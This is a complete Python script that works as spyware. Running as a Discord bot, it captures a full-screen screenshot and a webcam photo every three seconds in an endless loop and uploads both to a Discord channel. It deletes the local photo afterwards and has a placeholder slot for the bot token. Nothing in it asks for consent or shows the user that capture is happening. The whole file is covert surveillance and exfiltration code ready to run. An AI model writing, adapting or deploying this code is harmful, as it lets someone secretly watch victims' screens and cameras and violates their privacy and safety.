import os
import discord
import mss
import cv2
from PIL import Image
from io import BytesIO
import asyncio

# Initialize Discord client
client = discord.Client(intents=discord.Intents.all())

async def take_screenshot():
    # find the channel
    channel = discord.utils.get(client.get_all_channels(), name='CHANNEL NAME')
    if channel is None:
        print("channel not found")
    else:
        with mss.mss() as sct:
            # Get raw pixels from the screen
            img = sct.grab(sct.monitors[0])
            img = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
            buffer = BytesIO()
            img.save(buffer, 'PNG')
            buffer.seek(0)
            # Send to Discord
            await channel.send(file=discord.File(fp=buffer, filename='screenshot.png'))
    # Try to take photo from camera
    try:
        camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        if ret:
            # Save the image
            cv2.imwrite("photo.jpg", cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
            with open("photo.jpg", "rb") as f:
                # Send the photo to Discord
                await channel.send(file=discord.File(fp=f, filename="photo.jpg"))
            os.remove("photo.jpg")
        else:
            await channel.send("No camera found.")
    except:
        await channel.send("No camera found.")
    finally:
        camera.release()

@client.event
async def on_ready():
    while True:
        await take_screenshot()
        await asyncio.sleep(3)

client.run("ur discord token")
